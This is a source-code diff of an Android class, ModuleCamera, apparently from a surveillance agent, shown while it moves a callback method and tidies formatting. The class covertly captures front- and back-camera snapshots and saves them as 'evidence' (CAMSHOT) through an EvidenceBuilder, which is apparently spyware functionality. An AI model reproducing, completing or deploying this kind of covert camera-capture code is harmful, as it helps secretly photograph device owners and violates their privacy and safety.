@@ -37,9 +37,16 @@ public class ModuleCamera extends BaseInstantModule {
 
 	//private boolean face;
 
+	public static void callback(byte[] bs) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (callback), bs: " + bs.length);
+		}
+		EvidenceBuilder.atomic(EvidenceType.CAMSHOT, null, bs);
+	}
+
 	/*
 	 * (non-Javadoc)
-	 * 
+	 *
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
@@ -71,8 +78,6 @@ public class ModuleCamera extends BaseInstantModule {
 		}
 	}
 
-
-
 	/**
 	 * Snapshot.
 	 *
@@ -87,23 +92,16 @@ public class ModuleCamera extends BaseInstantModule {
 		if (Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
 			final CameraSnapshot camera = CameraSnapshot.self();
 
-			synchronized(Status.self().lockFramebuffer) {
+			synchronized (Status.self().lockFramebuffer) {
 				camera.snapshot(Camera.CameraInfo.CAMERA_FACING_FRONT);
 			}
 			Utils.sleep(100);
-			synchronized(Status.self().lockFramebuffer) {
+			synchronized (Status.self().lockFramebuffer) {
 				camera.snapshot(Camera.CameraInfo.CAMERA_FACING_BACK);
 			}
 
 		}
 
-	}
-
-	public static void callback(byte[] bs) {
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (callback), bs: " + bs.length);
-		}
-		EvidenceBuilder.atomic(EvidenceType.CAMSHOT, null, bs);
 	}
 
 }
